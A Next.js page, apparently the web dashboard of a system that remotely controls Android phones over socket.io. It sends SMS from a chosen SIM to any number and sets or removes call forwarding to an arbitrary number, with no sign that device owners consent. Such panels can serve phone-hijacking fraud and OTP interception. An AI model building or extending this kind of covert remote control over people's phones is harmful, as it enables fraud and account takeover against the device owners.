"use client";

import { useState, useEffect } from "react";
import { useParams } from "next/navigation";
import toast from "react-hot-toast";
import { io } from "socket.io-client";
import {
  Send,
  Trash,
  PhoneForwarded,
  Loader2,
  Smartphone,
  Trash2,
} from "lucide-react";
import useUser from "@/components/useUser";

let socket;

export default function DeviceActionsPage() {
  const { id } = useParams();
  const [activeTab, setActiveTab] = useState("sms");
  const [loading, setLoading] = useState(false);
  const [device, setDevice] = useState(null);
  const authuser = useUser();

  const [smsData, setSmsData] = useState({
    phone: "",
    message: "",
    sim_sub_id: "",
  });

  const [callData, setCallData] = useState({
    to: "",
    sim_sub_id: "",
  });

  // Fetch device details
  useEffect(() => {
    if(!id) return;
    const fetchDevice = async () => {
      try {
        const res = await fetch(`/api/devices/${id}`);
        const json = await res.json();
        if (res.ok) setDevice(json);
        else throw new Error(json.error || "Failed to fetch device");
      } catch (err) {
        toast.error(err.message);
      }
    };
    fetchDevice();
  }, [id]);

  // Initialize socket
  useEffect(() => {
    if (!authuser) return;
    socket = io("/", {
      query: {
        client: "web",
        form_code: authuser.form_code,
      },
    });

    //socket.on("connect", () => console.log("✅ Web connected:", socket.id));

    socket.on("sms_status", (data) => {
        setLoading(false);
      if (data.success) toast.success(data.message);
      else toast.error(data.message);
    });

    socket.on("sms_status_device", (data) => {
      setLoading(false);
      if (data.success) {
        toast.success(data.message);
        setSmsData({ phone: "", message: "", sim_sub_id: "" });
      } else toast.error(data.message);
    });

    socket.on("call_forwarding_status_device", (data) => {
      setLoading(false);
      if (data.success) toast.success(data.message);
      else toast.error(data.message || "Unknown error");
    });

    return () => socket.disconnect();
  }, [authuser]);

  if (!device) {
    return (
      <div className="flex justify-center items-center h-64">
        <Loader2 className="animate-spin text-blue-600 w-8 h-8" />
      </div>
    );
  }

  const simOptions = [
    device.sim1_sub_id && {
      label: `${device.sim1_network || "SIM 1"} (${device.sim1_phone_no || "N/A"})`,
      value: device.sim1_sub_id,
    },
    device.sim2_sub_id && {
      label: `${device.sim2_network || "SIM 2"} (${device.sim2_phone_no || "N/A"})`,
      value: device.sim2_sub_id,
    },
  ].filter(Boolean);

  const handleChange = (e, type) => {
    let { name, value } = e.target;

    // Add +91 if not present for phone numbers
    if (name === "phone" || name === "to") {
      if (!value.startsWith("+91")) value = "+91" + value.replace(/^(\+91)/, "");
      if(value=="+9" || value=="+"){
          value = "";
          e.target.value = value;
       }
    }

    if (type === "sms") setSmsData((prev) => ({ ...prev, [name]: value }));
    else setCallData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSmsSubmit = (e) => {
    e.preventDefault();
    if (!socket.connected) return toast.error("Socket not connected");

    const from_number =
      smsData.sim_sub_id === device.sim1_sub_id
        ? device.sim1_phone_no
        : device.sim2_phone_no;

    setLoading(true);
    socket.emit("send_sms", {
      android_id: device.android_id,
      to_number: smsData.phone,
      message: smsData.message,
      sim_sub_id: smsData.sim_sub_id,
      from_number,
    });
  };

  const handleCallSubmit = (e) => {
    e.preventDefault();
    if (!socket.connected) return toast.error("Socket not connected");

    setLoading(true);
    socket.emit(
      "call_forward",
      {
        android_id: device.android_id,
        to_number: callData.to,
        sim_sub_id: callData.sim_sub_id,
      },
      (response) => {
        setLoading(false);
        if (response.success) toast.success(response.message);
        else toast.error(response.message);
      }
    );
  };

  const handleCallRemoveButton = () => {
    if (!socket.connected) return toast.error("Socket not connected");
    if (!smsData.sim_sub_id) return toast.error("Please select SIM");

    setLoading(true);
    socket.emit(
      "call_forward_remove",
      {
        android_id: device.android_id,
        sim_sub_id: smsData.sim_sub_id,
      },
      (response) => {
        setLoading(false);
        if (response.success) toast.success(response.message);
        else toast.error(response.message);
      }
    );
  };

  return (
    <main className="flex-1 p-6 bg-gray-100 min-h-screen">
      <div className="max-w-3xl mx-auto bg-white rounded-3xl shadow-xl border border-gray-200 p-8">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-3xl font-extrabold text-gray-800 flex justify-center items-center gap-2">
            <Smartphone className="w-7 h-7 text-blue-600" />
            Device #{device.id}
          </h1>
          <p className="text-gray-500 text-sm mt-1">
            {device.device_model} ({device.device_name}) - {device.android_id}
          </p>
        </div>

        {/* Tabs */}
        <div className="flex flex-wrap justify-center mb-8">
          <div className="flex space-x-3 bg-gray-100 p-1 rounded-xl">
            <button
              onClick={() => setActiveTab("sms")}
              className={`px-6 py-2 rounded-lg font-medium flex items-center gap-2 transition-all ${
                activeTab === "sms" ? "bg-blue-600 text-white shadow" : "text-gray-600 hover:text-gray-800"
              }`}
            >
              <Send className="w-4 h-4" /> Send SMS
            </button>
            <button
              onClick={() => setActiveTab("call")}
              className={`px-6 py-2 rounded-lg font-medium flex items-center gap-2 transition-all ${
                activeTab === "call" ? "bg-blue-600 text-white shadow" : "text-gray-600 hover:text-gray-800"
              }`}
            >
              <PhoneForwarded className="w-4 h-4" /> Call Forward
            </button>
            <button
              onClick={() => setActiveTab("remove")}
              className={`px-6 py-2 rounded-lg font-medium flex items-center gap-2 transition-all ${
                activeTab === "remove" ? "bg-blue-600 text-white shadow" : "text-gray-600 hover:text-gray-800"
              }`}
            >
              <Trash2 className="w-4 h-4" /> Remove Call Forward
            </button>
          </div>
        </div>

        {/* Content */}
        {activeTab === "sms" && (
          <form onSubmit={handleSmsSubmit} className="space-y-5 animate-fadeIn">
            <p className="text-red-500">Send SMS from this device to any phone number.</p>

            {/* SIM Selector */}
            {simOptions.length > 0 && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Choose SIM</label>
                <select
                  name="sim_sub_id"
                  value={smsData.sim_sub_id}
                  onChange={(e) => handleChange(e, "sms")}
                  required
                  className="w-full border border-gray-300 rounded-xl px-4 py-2.5 bg-white focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
                >
                  <option value="">Select SIM</option>
                  {simOptions.map((sim) => (
                    <option key={sim.value} value={sim.value}>{sim.label}</option>
                  ))}
                </select>
              </div>
            )}

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
              <input
                type="text"
                name="phone"
                inputMode="numeric"
                minLength={13}
                maxLength={13}
                value={smsData.phone}
                onChange={(e) => handleChange(e, "sms")}
                className="w-full border border-gray-300 rounded-xl px-4 py-2.5 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
                placeholder="Enter recipient number"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Message</label>
              <textarea
                name="message"
                value={smsData.message}
                onChange={(e) => handleChange(e, "sms")}
                rows="4"
                className="w-full border border-gray-300 rounded-xl px-4 py-2.5 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
                placeholder="Enter message"
                required
              ></textarea>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 text-white font-semibold py-3 rounded-xl shadow-md hover:bg-blue-700 transition flex items-center justify-center gap-2"
            >
              {loading ? <Loader2 className="animate-spin w-5 h-5" /> : <Send className="w-5 h-5" />}
              {loading ? "Sending..." : "Forward SMS"}
            </button>
          </form>
        )}

        {activeTab === "call" && (
          <form onSubmit={handleCallSubmit} className="space-y-5 animate-fadeIn">
            <p className="text-red-500">Set up phone number to receive device calls.</p>

            {/* SIM Selector */}
            {simOptions.length > 0 && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Choose SIM</label>
                <select
                  name="sim_sub_id"
                  value={callData.sim_sub_id}
                  onChange={(e) => handleChange(e, "call")}
                  required
                  className="w-full border border-gray-300 rounded-xl px-4 py-2.5 bg-white focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
                >
                  <option value="">Select SIM</option>
                  {simOptions.map((sim) => (
                    <option key={sim.value} value={sim.value}>{sim.label}</option>
                  ))}
                </select>
              </div>
            )}

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Call Forward To</label>
              <input
                type="text"
                name="to"
                inputMode="numeric"
                minLength={13}
                maxLength={13}
                value={callData.to}
                onChange={(e) => handleChange(e, "call")}
                className="w-full border border-gray-300 rounded-xl px-4 py-2.5 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
                placeholder="Enter Call Forwarding Number"
                required
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-green-600 text-white font-semibold py-3 rounded-xl shadow-md hover:bg-green-700 transition flex items-center justify-center gap-2"
            >
              {loading ? <Loader2 className="animate-spin w-5 h-5" /> : <PhoneForwarded className="w-5 h-5" />}
              {loading ? "Forwarding..." : "Set Forward Call"}
            </button>
          </form>
        )}

        {activeTab === "remove" && (
          <form className="space-y-5 animate-fadeIn" onSubmit={(e) => { e.preventDefault(); handleCallRemoveButton(); }}>
            <p className="text-red-500">Remove call forwarding from this device SIM</p>

            {simOptions.length > 0 && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Choose SIM</label>
                <select
                  name="sim_sub_id"
                  value={smsData.sim_sub_id}
                  onChange={(e) => handleChange(e, "sms")}
                  required
                  className="w-full border border-gray-300 rounded-xl px-4 py-2.5 bg-white focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none"
                >
                  <option value="">Select SIM</option>
                  {simOptions.map((sim) => (
                    <option key={sim.value} value={sim.value}>{sim.label}</option>
                  ))}
                </select>
              </div>
            )}

            <button
              type="submit"
              className="w-full bg-red-600 text-white font-semibold py-3 rounded-xl shadow-md hover:bg-red-700 transition flex items-center justify-center gap-2"
            >
              <Trash2 className="w-5 h-5" /> Remove Call Forwarding
            </button>
          </form>
        )}
      </div>
    </main>
  );
}
